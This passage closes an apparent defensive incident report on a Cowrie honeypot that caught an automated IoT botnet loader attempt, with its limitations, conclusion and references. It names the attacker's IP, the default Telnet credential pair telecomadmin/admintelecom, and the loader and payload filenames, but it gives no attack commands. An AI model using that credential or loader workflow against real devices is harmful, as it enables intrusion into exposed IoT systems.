   Cowrie is an emulated environment. Some shell behavior may differ from a real Linux host.

2. **Cowrie Shell Emulation Errors:**  
   Some attacker commands failed due to Cowrie emulation limitations, including loop and shell syntax behavior.

3. **No Confirmed Full Malware Execution:**  
   The investigation confirms loader retrieval, payload deployment attempts, and partial ARM ELF reconstruction. It does not confirm successful execution of a complete malware payload.

4. **Partial ELF Artifact:**  
   The ARM ELF artifact was incomplete. The file size was `37,728` bytes, while section headers were expected at offset `112,784`, causing `readelf` errors.

5. **No Confirmed C2 or Botnet Enrollment:**  
   No command-and-control enrollment or DDoS capability was confirmed during this analysis.

6. **No Specific Family Attribution:**  
   The activity resembles IoT/Linux botnet-style loader workflows, but this report does not attribute the activity to Mirai, Gafgyt, Kaiten, Mozi, Qbot, or another specific family.

7. **No Geographic Attribution:**  
   The filename prefix `iran.*` and GeoIP information do not establish actor identity, location, or motivation.

8. **NetFlow Timing Limitation:**  
   NetFlow records are used as supporting flow telemetry. Their timestamps may represent export time, flow end time, or aggregation timing rather than the exact first packet time.

---

# 14. Conclusion

The DShield Cowrie honeypot captured a well-supported example of automated post-authentication malware loader activity. The attacker connected from `31.56.209.72`, authenticated over Telnet using `telecomadmin / admintelecom`, tested writable directories, attempted process cleanup, retrieved a shell loader named `cat.sh`, attempted to download and execute multiple architecture-specific Linux payloads, and attempted fallback reconstruction of an ARM ELF executable.

The investigation is strong because the activity was confirmed across multiple independent telemetry sources:

- DShield portal records.
- Cowrie TTY replay.
- PCAP / Wireshark Follow TCP Stream.
- Elastic endpoint telemetry.
- Zeek connection logs.
- Zeek HTTP logs.
- Zeek file logs.
- Suricata IDS alert.
- NetFlow records.
- Cowrie downloaded payload artifacts.
- Local static artifact analysis.

NetFlow strengthened the report by corroborating both the inbound Telnet flow and the outbound HTTP loader retrieval flows, including matching community IDs for the internal `192.168.50.200` HTTP flows and Zeek/Suricata events. NetFlow also helped explain the relationship between the internal honeypot IP and the public/NAT IP observed in the investigation.

The strongest defensible assessment is:

> **This was an automated Linux/IoT malware deployment attempt against a Cowrie Telnet honeypot, with behavior consistent with publicly documented IoT botnet-style loader workflows.**

This report does not confirm successful malware execution, successful botnet enrollment, or attribution to a specific malware family. The evidence supports attempted infection behavior, not confirmed compromise of a real production system.

---

# 15. Reference Page

## [R1] Antonakakis et al. — “Understanding the Mirai Botnet”

- **Publisher:** USENIX Security 2017  
- **Use in report:** Supports background on Mirai-style IoT botnet behavior, including Telnet/SSH scanning, hardcoded IoT credentials, and loader-based infection workflows.  
- **Link:** <https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/antonakakis>

## [R2] Fortinet FortiGuard Labs — “Tracking Mirai Variant Nexcorium: A Vulnerability-Driven IoT Botnet Campaign”

- **Use in report:** Supports comparison to modern Mirai-style IoT botnet campaigns involving default credentials, brute-force behavior, and multi-architecture malware delivery.  
- **Link:** <https://www.fortinet.com/blog/threat-research/tracking-mirai-variant-nexcorium-a-vulnerability-driven-iot-botnet-campaign>

## [R3] Trend Micro — “Worm War: The Botnet Battle for IoT Territory”

- **Use in report:** Supports discussion of IoT botnet competition, process-killing behavior, and malware families competing for control of exposed devices.  
- **Link:** <https://documents.trendmicro.com/assets/white_papers/wp-worm-war-the-botnet-battle-for-iot-territory.pdf>

## [R4] Zhu et al. — “Devils in the Clouds: An Evolutionary Study of Telnet Bot Loaders”

- **Use in report:** Supports the concept of Telnet bot loaders and loader-based IoT infection workflows.  
- **Link:** <https://arxiv.org/abs/2211.14790>

## [R5] MITRE ATT&CK T1059 — Command and Scripting Interpreter

- **Use in report:** Describes attacker use of shell commands and script execution.  
- **Link:** <https://attack.mitre.org/techniques/T1059/>

## [R6] MITRE ATT&CK T1105 — Ingress Tool Transfer

- **Use in report:** Describes transfer of `cat.sh` and attempted retrieval of `iran.*` payloads from external infrastructure.  
- **Link:** <https://attack.mitre.org/techniques/T1105/>

## [R7] MITRE ATT&CK T1071.001 — Web Protocols

- **Use in report:** Describes HTTP-based retrieval of loader and payload files.  
- **Link:** <https://attack.mitre.org/techniques/T1071/001/>

## [R8] MITRE ATT&CK T1082 — System Information Discovery

- **Use in report:** Describes `cat /proc/cpuinfo` activity.  
- **Link:** <https://attack.mitre.org/techniques/T1082/>

## [R9] MITRE ATT&CK T1078 — Valid Accounts

- **Use in report:** Describes credential-based access using accepted account credentials.  
- **Link:** <https://attack.mitre.org/techniques/T1078/>

## [R10] MITRE ATT&CK T1110 — Brute Force

- **Use in report:** Describes credential-guessing behavior where applicable.  
- **Link:** <https://attack.mitre.org/techniques/T1110/>
